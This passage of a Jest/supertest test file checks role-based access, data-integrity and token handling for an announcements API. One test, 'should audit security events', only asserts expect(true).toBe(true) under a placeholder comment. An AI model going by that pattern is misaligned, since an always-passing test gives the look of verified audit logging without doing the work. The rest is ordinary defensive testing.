      test('[TC-SEC-001-13] should handle concurrent unauthorized access attempts', async () => {
        const maliciousRequests = Array.from({ length: 10 }, () =>
          request(app)
            .post('/api/announcements')
            .set('Authorization', 'Bearer fake_token')
            .send({ title: 'Attack', content: 'Attack' })
        );

        const responses = await Promise.all(maliciousRequests);
        
        // All should be unauthorized
        responses.forEach(response => {
          expect(response.status).toBe(403);
        });
      });
    });

    describe('Data Integrity and Security', () => {
      test('[TC-SEC-001-14] should prevent announcement tampering', async () => {
        const announcement = await Announcement.create({
          title: 'Original',
          content: 'Original content',
          createdBy: adminUser._id,
          isActive: true
        });

        // Attempt to tamper with system fields
        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Updated',
            content: 'Updated content',
            createdBy: employeeUser._id, // Should not be modifiable
            created_at: new Date('2020-01-01'), // Should not be modifiable
            _id: 'different_id' // Should not be modifiable
          });

        expect(response.status).toBe(200);
        
        // Verify system fields weren't tampered with
        const updatedAnnouncement = await Announcement.findById(announcement._id);
        expect(updatedAnnouncement.createdBy.toString()).toBe(adminUser._id.toString());
        expect(updatedAnnouncement._id.toString()).toBe(announcement._id.toString());
      });

      test('[TC-SEC-001-15] should audit security events', async () => {
        // Attempt unauthorized access
        await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized', content: 'Test' });

        // Security events should be logged (implementation dependent)
        // This test verifies the endpoint properly handles and logs security violations
        expect(true).toBe(true); // Placeholder for audit log verification
      });
    });

    describe('Session and Token Security', () => {
      test('[TC-SEC-001-16] should handle token expiry gracefully', async () => {
        // This would require a short-lived test token
        // For now, we test the error handling path
        const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid';
        
        const response = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${expiredToken}`);

        expect(response.status).toBe(403);
        expect(response.body.error).toBe('Invalid or expired token');
      });

      test('[TC-SEC-001-17] should prevent session fixation', async () => {
        // Generate fresh token
        const loginResponse1 = await request(app)
          .post('/api/auth/login')
          .send({ email: 'admin@test.com', password: 'password123' });
        
        // Generate another token for same user
        const loginResponse2 = await request(app)
          .post('/api/auth/login')
          .send({ email: 'admin@test.com', password: 'password123' });

        // Both tokens should be valid and different
        expect(loginResponse1.body.token).not.toBe(loginResponse2.body.token);
        
        const response1 = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${loginResponse1.body.token}`);
        
        const response2 = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${loginResponse2.body.token}`);

        expect(response1.status).toBe(200);
        expect(response2.status).toBe(200);
      });
    });
  });

  describe('[TC-AN-001] Admin user navigates to announcements management', () => {
    test('[TC-AN-001-HP] should show announcement creation form for admin user', async () => {
      const response = await request(app)
        .get('/api/announcements/admin')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toEqual(expect.arrayContaining([]));
    });

    test('[TC-AN-001-HP] should allow admin to access announcement creation endpoint', async () => {
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: 'Test Announcement',
          content: 'This is a test announcement content'
        });

      expect(response.status).toBe(201);
      expect(response.body.success).toBe(true);
      expect(response.body.data.title).toBe('Test Announcement');
    });

    test('[TC-AN-001-EP] should handle admin access when database is unavailable', async () => {
      // Mock database connection failure
      const originalFind = Announcement.find;
      Announcement.find = jest.fn().mockRejectedValue(new Error('Database connection failed'));

      const response = await request(app)
        .get('/api/announcements/admin')
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(500);
      expect(response.body.error).toContain('Internal server error');

      // Restore original method
      Announcement.find = originalFind;
    });
  });

  describe('[TC-AN-002] Admin creates and publishes new announcement', () => {
    test('[TC-AN-002-HP] should save announcement to database and make it visible immediately', async () => {
      const announcementData = {
        title: 'Company Update',
        content: 'Important company-wide update for all employees'
      };

      // Create announcement
      const createResponse = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send(announcementData);

      expect(createResponse.status).toBe(201);
      expect(createResponse.body.success).toBe(true);
      testAnnouncement = createResponse.body.data;

      // Verify it's immediately visible to employees
      const dashboardResponse = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(dashboardResponse.status).toBe(200);
      const announcements = dashboardResponse.body;
      expect(announcements).toHaveLength(1);
      expect(announcements[0].title).toBe('Company Update');
      expect(announcements[0].content).toBe('Important company-wide update for all employees');
    });

    test('[TC-AN-002-EP] should validate required fields when creating announcement', async () => {
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ title: '' });

      expect(response.status).toBe(400);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Validation errors');
    });

    test('[TC-AN-002-EP] should handle database save failures during announcement creation', async () => {
      const originalCreate = Announcement.create;
      Announcement.create = jest.fn().mockRejectedValue(new Error('Database save failed'));

      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          title: 'Test Announcement',
          content: 'Test content'
        });

      expect(response.status).toBe(500);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Failed to create announcement');

      // Restore original method
      Announcement.create = originalCreate;
    });
  });

  describe('[TC-AN-003] Employee views announcements on dashboard', () => {
    beforeEach(async () => {
      // Create test announcements
      await Announcement.create({
        title: 'First Announcement',
        content: 'First announcement content',
        createdBy: adminUser._id,
        isActive: true
      });

      await Announcement.create({
        title: 'Second Announcement',
        content: 'Second announcement content',
        createdBy: adminUser._id,
        isActive: true
      });
    });

    test('[TC-AN-003-HP] should display all active announcements with title, content, and publish date', async () => {
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toHaveLength(2);
      
      response.body.forEach(announcement => {
        expect(announcement).toHaveProperty('title');
        expect(announcement).toHaveProperty('content');
        expect(announcement).toHaveProperty('created_at');
        expect(announcement.title).toBeTruthy();
        expect(announcement.content).toBeTruthy();
      });
    });

    test('[TC-AN-003-HP] should sort announcements by creation date (newest first)', async () => {
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      const announcements = response.body;
      
      for (let i = 0; i < announcements.length - 1; i++) {
        const current = new Date(announcements[i].created_at);
        const next = new Date(announcements[i + 1].created_at);
        expect(current.getTime()).toBeGreaterThanOrEqual(next.getTime());
      }
    });

    test('[TC-AN-003-EP] should handle empty announcements list gracefully', async () => {
      await Announcement.deleteMany({});

      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toEqual([]);
    });

    test('[TC-AN-003-EP] should handle database query failures when fetching announcements', async () => {
      const originalFind = Announcement.find;
      Announcement.find = jest.fn().mockReturnValue({
        populate: jest.fn().mockReturnValue({
          sort: jest.fn().mockRejectedValue(new Error('Database query failed'))
        })
      });

      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(500);
      expect(response.body.error).toContain('Failed to fetch announcements');

      // Restore original method
      Announcement.find = originalFind;
    });
  });

  describe('[TC-AN-004] Non-admin user access restrictions', () => {
    test('[TC-AN-004-EP] should deny employee access to announcement creation interface', async () => {
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({
          title: 'Unauthorized Announcement',
          content: 'This should not be allowed'
        });

      expect(response.status).toBe(403);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toBe('Access denied. Admin privileges required.');
    });

    test('[TC-AN-004-EP] should deny manager access to announcement creation interface', async () => {
      const response = await request(app)
        .post('/api/announcements')
        .set('Authorization', `Bearer ${managerToken}`)
        .send({
          title: 'Manager Announcement',
          content: 'Manager trying to create announcement'
        });

      expect(response.status).toBe(403);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toBe('Access denied. Admin privileges required.');
    });

    test('[TC-AN-004-EP] should deny employee access to admin announcement management', async () => {
      const response = await request(app)
        .get('/api/announcements/admin')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(403);
      expect(response.body.error).toBe('Access denied. Admin privileges required.');
    });

    test('[TC-AN-004-HP] should allow employee to view public announcements despite creation restrictions', async () => {
      // Create announcement as admin
      await Announcement.create({
        title: 'Public Announcement',
        content: 'This should be visible to employees',
        createdBy: adminUser._id,
        isActive: true
      });

      // Employee should still be able to view
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(response.status).toBe(200);
      expect(response.body).toHaveLength(1);
      expect(response.body[0].title).toBe('Public Announcement');
    });
  });

  describe('[TC-AN-005] Admin edits and deletes announcements', () => {
    beforeEach(async () => {
      testAnnouncement = await Announcement.create({
        title: 'Original Title',
        content: 'Original content',
        createdBy: adminUser._id,
        isActive: true
      });
    });

    test('[TC-AN-005-HP] should allow admin to edit announcement content', async () => {
      const updatedData = {
        title: 'Updated Title',
        content: 'Updated content with new information'
      };

      const response = await request(app)
        .put(`/api/announcements/${testAnnouncement._id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send(updatedData);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);

      // Verify changes are reflected immediately
      const dashboardResponse = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(dashboardResponse.body[0].title).toBe('Updated Title');
      expect(dashboardResponse.body[0].content).toBe('Updated content with new information');
    });

    test('[TC-AN-005-HP] should allow admin to delete announcement', async () => {
      const response = await request(app)
        .delete(`/api/announcements/${testAnnouncement._id}`)
        .set('Authorization', `Bearer ${adminToken}`);

      expect(response.status).toBe(200);
      expect(response.body.success).toBe(true);

      // Verify announcement is no longer visible
      const dashboardResponse = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);

      expect(dashboardResponse.body).toHaveLength(0);
    });

    test('[TC-AN-005-EP] should return 404 when trying to edit non-existent announcement', async () => {
      const response = await request(app)
        .put('/api/announcements/507f1f77bcf86cd799439011')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ title: 'Updated', content: 'Updated content' });

      expect(response.status).toBe(404);
      expect(response.body.success).toBe(false);
    });

    test('[TC-AN-005-EP] should handle database update failures during announcement edit', async () => {
      const originalFindByIdAndUpdate = Announcement.findByIdAndUpdate;
      Announcement.findByIdAndUpdate = jest.fn().mockRejectedValue(new Error('Database update failed'));

      const response = await request(app)
        .put(`/api/announcements/${testAnnouncement._id}`)
        .set('Authorization', `Bearer ${adminToken}`)
        .send({ title: 'Updated', content: 'Updated content' });

      expect(response.status).toBe(500);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toContain('Failed to update announcement');

      // Restore original method
      Announcement.findByIdAndUpdate = originalFindByIdAndUpdate;
    });

    test('[TC-AN-005-EP] should prevent non-admin users from editing announcements', async () => {
      const response = await request(app)
        .put(`/api/announcements/${testAnnouncement._id}`)
        .set('Authorization', `Bearer ${employeeToken}`)
        .send({ title: 'Unauthorized Update' });

      expect(response.status).toBe(403);
      expect(response.body.success).toBe(false);
      expect(response.body.message).toBe('Access denied. Admin privileges required.');
    });
  });

  describe('[TC-AN-006] No announcements scenario', () => {
    test('[TC-AN-006-HP] should return empty array when no active announcements exist', async () => {
      const response = await request(app)
        .get('/api/announcements')
        .set('Authorization', `Bearer ${employeeToken}`);